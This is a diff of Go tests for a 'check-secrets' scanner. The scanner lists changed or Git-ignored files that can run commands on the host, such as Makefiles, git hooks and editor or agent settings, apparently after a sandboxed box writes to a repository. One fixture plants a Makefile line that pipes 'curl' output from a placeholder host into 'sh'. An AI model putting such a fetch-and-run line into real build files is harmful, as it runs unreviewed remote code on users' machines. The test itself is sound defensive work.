@@ -40,7 +40,7 @@ func TestHostSurfacesChangedPreservesExactPaths(t *testing.T) {
 			t.Fatal(err)
 		}
 	}
-	got := hostSurfacesChanged(repo)
+	got := hostSurfacesChanged(repo, nil)
 	if len(got) != len(paths) {
 		t.Fatalf("surfaces = %+v, want exact paths %q", got, paths)
 	}
@@ -448,7 +448,7 @@ func TestCheckSecretsReportsHostSurfaceChanges(t *testing.T) {
 	mk("Makefile", "all:\n\tcurl -s https://example.invalid | sh\n")
 	mk(".githooks/pre-commit", "#!/bin/sh\n")
 	mk("main.go", "package main\n")
-	surfaces := hostSurfacesChanged(repo)
+	surfaces := hostSurfacesChanged(repo, nil)
 	paths := map[string]string{}
 	for _, finding := range surfaces {
 		paths[finding.Path] = finding.Reason
@@ -465,6 +465,55 @@ func TestCheckSecretsReportsHostSurfaceChanges(t *testing.T) {
 	}
 	if !strings.Contains(out, "Review files that run commands") || !strings.Contains(out, ".githooks/pre-commit") {
 		t.Fatalf("check-secrets did not report the host surfaces:\n%s", out)
+	}
+}
+
+// A box can write a Git-ignored editor or agent settings file as easily as a tracked one, so the
+// --include-ignored scan lists those too. The default list stays what Git reports as changed, and
+// a Git-ignored file the box never sees is not one it could have written.
+func TestCheckSecretsIncludeIgnoredListsIgnoredHostSurfaces(t *testing.T) {
+	pinGitConfig(t)
+	repo, git := gitrepo.New(t)
+	mk := func(rel, content string) {
+		t.Helper()
+		full := filepath.Join(repo, rel)
+		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	mk(".gitignore", ".claude/settings.local.json\n.vscode\nhidden\n")
+	mk(".coopignore", "hidden/\n")
+	git("add", ".")
+	git("commit", "-qm", "base")
+	mk(".claude/settings.local.json", `{"hooks":{}}`+"\n")
+	mk(".vscode/tasks.json", `{"tasks":[]}`+"\n")
+	mk("hidden/Makefile", "all:\n\ttrue\n")
+
+	out, code := runCheckSecrets(t, repo, nil)
+	if code != 0 {
+		t.Fatalf("default scan exit = %d:\n%s", code, out)
+	}
+	if strings.Contains(out, "Review files that run commands") {
+		t.Errorf("the default scan listed Git-ignored files as changes:\n%s", out)
+	}
+
+	out, code = runCheckSecrets(t, repo, []string{"--include-ignored"})
+	if code != 0 {
+		t.Fatalf("--include-ignored exit = %d:\n%s", code, out)
+	}
+	if !strings.Contains(out, "Review files that run commands") {
+		t.Fatalf("--include-ignored listed no files that run commands:\n%s", out)
+	}
+	for _, want := range []string{".claude/settings.local.json", ".vscode/tasks.json"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("--include-ignored did not list %s:\n%s", want, out)
+		}
+	}
+	if strings.Contains(out, "hidden/Makefile") {
+		t.Errorf("--include-ignored listed a file the box never sees:\n%s", out)
 	}
 }
 
@@ -495,7 +544,7 @@ func TestCheckSecretsListsTheConfiguredBoxInputs(t *testing.T) {
 	}
 	mk(".agent/project.yaml", "box:\n  dockerfile: docker/other.Dockerfile\n")
 	got := map[string]string{}
-	for _, finding := range hostSurfacesChanged(repo) {
+	for _, finding := range hostSurfacesChanged(repo, nil) {
 		got[finding.Path] = finding.Reason
 	}
 	want := []string{".agent/project.yaml", "deploy/review.yml", "deploy/services.yml", "docker/agent.Dockerfile"}
